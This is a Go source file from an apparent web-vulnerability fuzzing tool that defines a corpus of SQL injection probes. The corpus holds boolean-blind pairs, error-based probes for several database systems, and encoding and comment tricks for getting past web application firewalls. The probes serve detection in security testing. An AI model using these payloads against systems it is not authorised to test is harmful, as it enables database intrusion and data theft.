// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash

package fuzz

// SQLiBooleanProbes is the differential pair: a true and a false predicate.
// What: a value-change probe whose response difference (masked) proves the
// input reaches a SQL predicate without relying on visible error output.
// Why: boolean-blind targets never echo errors; the pair + control is the
// only in-band signal.
var SQLiBooleanProbes = []string{
	"' AND '1'='1",
	"' AND '1'='2",
}

// SQLiErrorProbes are error-based probes covering major DBMS families.
// What: ten non-destructive probes (no DROP/DELETE/write), each crafted so
// the resulting error, when echoed, matches an error-oracle signature:
// MySQL (EXTRACTVALUE/UPDATEXML XPATH), MSSQL (CONVERT int), PostgreSQL
// (CAST VERSION), SQLite (cast sqlite_version), plus case-mixing and
// double-encoding/tab/versioned-comment WAF bypass variants.
// Why: one corpus shared by the Go engine and the Tier 2 JS plugin keeps
// live fuzzing and fixture-tested plugin behavior in lockstep.
var SQLiErrorProbes = []string{
	"AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
	"AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
	"AND 1=CONVERT(int,@@version)",
	"AND 1=CAST(VERSION() AS int)",
	"AND 1=CAST(sqlite_version() AS int)",
	"aNd 1=CoNvErT(iNt,@@version)",
	"%27%20AND%201=1--%20",
	"%2527%2520AND%25201=1--%2520",
	"'%09AND%09/**/1=1--",
	"/*!50000AND*/ 1=1--",
}

// SQLiProbes returns the full ordered corpus: boolean pair first (cheapest
// differential), then error probes (signature-classifiable).
func SQLiProbes() []string {
	out := make([]string, 0, len(SQLiBooleanProbes)+len(SQLiErrorProbes))
	out = append(out, SQLiBooleanProbes...)
	out = append(out, SQLiErrorProbes...)
	return out
}
